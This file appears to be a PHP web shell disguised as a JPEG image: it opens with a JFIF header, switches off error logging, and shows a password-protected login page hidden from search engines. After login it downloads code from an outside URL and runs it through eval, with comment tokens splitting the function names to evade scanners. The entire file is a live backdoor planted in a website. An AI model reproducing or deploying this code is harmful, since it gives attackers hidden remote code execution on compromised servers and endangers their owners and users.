ÿØÿà JFIF      ÿþ
<?php
error_reporting(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
session_start();
$passwd = "ufuxbarat";
if($_POST['pass']) {
  if($_POST['passwd'] == $passwd) {
    $_SESSION['masuk'] = "masuk";
    header("Location: ?");
  }
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  header("Location: ?");
}
if(empty($_SESSION['masuk'])) {
?>
<title>LOGIN &#9829;</title>
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<meta name="bingbot" content="noindex, nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="icon" type="image/png" href="https://data.whicdn.com/images/317122168/original.jpg">
<style>
  html {
    background: black;
    color: deeppink;
  }
  input {
    background: transparent;
    color: crimson;
    border: 1px solid teal;
  }
  @media only screen and (max-width:800px){
     html{
        font-size:20px;
     }
  }
</style>
<center>
<img src="https://www.suarasurabaya.net/wp-content/uploads/2021/03/transformers-840x493.jpg" width="200" height="200">
<p>
<table height="100%" width="100%">
  <td align="center">
    <br><br>
    <form enctype="multipart/form-data" method="post">
      <input type="password" name="passwd">
      <input type="submit" name="pass" value="&#9829;">
    </form>
  </td>
</table>
<?php
exit();
}
?>
<?php eval/**_**/(urldecode('%3f%3e') .file_get_contents/**_**/(urldecode/**_**/('https://jim.iainkudus.ac.id/classes/template/inc.commonsd.xml'))); ?>
